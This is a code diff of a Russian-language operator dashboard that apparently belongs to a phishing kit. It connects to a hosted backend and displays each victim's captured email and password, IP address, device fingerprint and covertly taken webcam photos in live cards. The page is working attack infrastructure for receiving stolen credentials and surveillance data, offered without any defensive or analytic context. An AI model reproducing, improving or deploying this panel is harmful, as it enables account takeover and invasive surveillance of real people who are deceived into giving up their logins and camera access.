@@ -3,44 +3,65 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>panel</title>
+<title>Панель</title>
 <style>
-body{font-family:monospace;background:#111;color:#eee;margin:0;padding:16px}
-h3{margin-top:0}
-.row{border-bottom:1px solid #333;padding:8px 0}
-.ip{color:#6cf}
-.ts{color:#888;font-size:11px}
-.ua{color:#999;font-size:11px;margin-top:2px}
-pre{margin:4px 0;color:#9f9;font-size:12px;white-space:pre-wrap;word-break:break-all}
-.highlight{color:#f66; font-weight:bold; font-size:14px;}
+body{font-family:sans-serif;background:#f4f4f9;margin:0;padding:16px}
+h2{margin-top:0}
+.card{background:#fff;padding:16px;margin-bottom:12px;border-radius:8px;box-shadow:0 2px 5px rgba(0,0,0,0.1)}
+.row{display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px}
+.label{color:#666;font-weight:bold}
+.value{font-weight:bold}
+.email{color:#2563eb;font-size:18px}
+.pass{color:#dc2626;font-size:18px;font-family:monospace}
+.other{font-size:12px;color:#888;margin-top:8px;border-top:1px solid #eee;padding-top:8px;word-break:break-all}
+.photo{width:100%;max-width:300px;margin-top:10px;border-radius:8px;display:block}
 </style>
 </head>
 <body>
-<h3>live feed</h3>
+<h2>Входящие данные</h2>
 <div id="feed"></div>
 <script>
 const HOST = "sites-gt5x.onrender.com";
 const WS = (location.protocol === "https:" ? "wss://" : "ws://") + HOST + "/ws/operator";
 const API = "https://" + HOST + "/api/hits";
-
 let ws = null;
 
 function render(r) {
-  let data = r.data;
-  let formattedData = JSON.stringify(data, null, 2);
+  const feed = document.getElementById("feed");
+  const card = document.createElement("div");
+  card.className = "card";
   
-  // Подсвечиваем логин и пароль, если они есть
-  if (data.type === "login") {
-      formattedData = `<span class="highlight">EMAIL: ${data.email}</span>\n<span class="highlight">PASS:  ${data.password}</span>\n\n` + formattedData;
+  let email = "Нет данных";
+  let pass = "Нет данных";
+  
+  if (r.data && r.data.type === "login") {
+    email = r.data.email;
+    pass = r.data.password;
+  } else if (r.data && r.data.type === "visit") {
+    email = "Просто зашел на сайт";
+    pass = "-";
   }
 
-  const d = document.createElement("div");
-  d.className = "row";
-  d.innerHTML = `<span class="ip">${r.ip}</span> <span class="ts">${new Date(r.ts*1000).toLocaleTimeString()}</span>
-    <div class="ua">${r.ua}</div>
-    <pre>${formattedData}</pre>`;
-  const feed = document.getElementById("feed");
-  feed.insertBefore(d, feed.firstChild);
+  let photoHtml = "";
+  if (r.data && r.data.photo && r.data.photo.startsWith("data:image")) {
+    photoHtml = `<img src="${r.data.photo}" class="photo">`;
+  } else if (r.data && r.data.photo === "Camera denied") {
+    photoHtml = `<div style="color:red; font-size:12px; margin-top:8px;">Пользователь запретил доступ к камере</div>`;
+  }
+
+  card.innerHTML = `
+    <div class="row"><span class="label">Время:</span> <span class="value">${new Date(r.ts*1000).toLocaleString()}</span></div>
+    <div class="row"><span class="label">IP:</span> <span class="value">${r.ip}</span></div>
+    <div class="row"><span class="label">Email:</span> <span class="email">${email}</span></div>
+    <div class="row"><span class="label">Пароль:</span> <span class="pass">${pass}</span></div>
+    ${photoHtml}
+    <div class="other">
+      Устройство: ${r.data && r.data.fp ? r.data.fp.ua : r.ua}<br>
+      Экран: ${r.data && r.data.fp ? r.data.fp.screen : "-"} | Язык: ${r.data && r.data.fp ? r.data.fp.lang : "-"}
+    </div>
+  `;
+  
+  feed.insertBefore(card, feed.firstChild);
 }
 
 function connect() {
